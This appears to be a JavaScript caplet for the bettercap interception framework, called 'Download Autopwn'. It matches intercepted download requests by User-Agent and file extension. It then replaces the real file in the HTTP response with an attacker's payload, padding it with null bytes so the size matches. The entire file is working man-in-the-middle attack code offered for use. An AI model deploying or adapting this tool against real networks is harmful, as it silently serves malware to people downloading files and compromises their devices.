var targets = {},
    devices = []

var nullbyte = "\u0000"

var green   = "\033[32m",
    boldRed = "\033[1;31m",
    onRed   = "\033[41m",
    reset   = "\033[0m"

function onLoad() {
	devices = env("downloadautopwn.devices").split(",")
	logStr = ""
	for (var i = 0; i < devices.length; i++) {
		item = {
			"device": devices[i],
			"useragent": env("downloadautopwn.useragent." + devices[i]),
			"extensions": env("downloadautopwn.extensions." + devices[i]).toLowerCase().split(",")
		}
		targets[i] = item
		logStr += "\n  " + green + targets[i]["device"] + reset +
			  "\n    User-Agent: " + targets[i]["useragent"] + 
			  "\n    Extensions: " + targets[i]["extensions"] + "\n"
	}
	log("Download Autopwn loaded.\n\nDownload Autopwn targets: \n" + logStr)
}

function onResponse(req, res) {
	// First of all check whether the requested path might have an extension (to save cpu)
	var strippedPath = req.Path.replace(/.*\//g, "")
	if (strippedPath.indexOf(".") != -1) {
		var userAgent,
		    extension
		// Grab User-Agent
		for (var h = 0; h < req.Headers.length; h++) {
			if (req.Headers[h]["Name"] == "User-Agent") {
				userAgent = req.Headers[h]["Value"]
			}
		}
		// Iterate through targets
		for (var t = 0; t < Object.keys(targets).length; t++) {
			// Check if User-Agent is a target
			regex = new RegExp(targets[t]["useragent"])
			if ( userAgent.match(regex) ) {
				// Iterate through target extensions
				for (var e = 0; e < targets[t]["extensions"].length; e++) {
					// Check if requested path contains a targeted extension
					// function endsWith() could be a nice simplification here
					if ( strippedPath.replace(/.*\./g, "").toLowerCase() == targets[t]["extensions"][e] ) {
						extension = targets[t]["extensions"][e]
						// Autopwn
						logStr = "\n\n  " + onRed + " " + reset + "  Autopwning download request from " + boldRed + req.Client + reset
						logStr += "\n  " + onRed + " " + reset
						logStr += "\n  " + onRed + " " + reset + "  Found " + boldRed + extension.toUpperCase() + reset + " extension in " + boldRed + req.Hostname + req.Path + reset
						logStr += "\n  " + onRed + " " + reset
						logStr += "\n  " + onRed + " " + reset + "  Grabbing " + boldRed + targets[t]["device"].toUpperCase() + reset + " payload..."
						// Check requested file size
						requestedFile = res.ReadBody()
						requestedFileSize = requestedFile.length
						payload = readFile("caplets/download-autopwn/" + targets[t]["device"] + "/payload." + extension)
						payloadSize = payload.length
						logStr += "\n  " + onRed + " " + reset + "  The size of the requested file is " + boldRed + requestedFileSize + reset + " bytes"
						logStr += "\n  " + onRed + " " + reset + "  The raw size of your payload is " + boldRed + payloadSize + reset + " bytes"
						logStr += "\n  " + onRed + " " + reset
						// Append nullbytes to payload if resizing is enabled and if requested file is larger than payload
						if (requestedFileSize > payloadSize && env("downloadautopwn.resizepayloads") == "true") {
							logStr += "\n  " + onRed + " " + reset + "  Resizing your payload to " + boldRed + requestedFileSize + reset + " bytes..."
							sizeDifference = requestedFileSize - payloadSize
							nullbyteString = Array(sizeDifference + 1).join(nullbyte)
							payload += nullbyteString
						}
						logStr += "\n  " + onRed + " " + reset + "  Serving your payload to " + boldRed + req.Client + reset + "...\n"
						log(logStr)
						res.Body = payload
					}
				}
			}
		}
	}
}
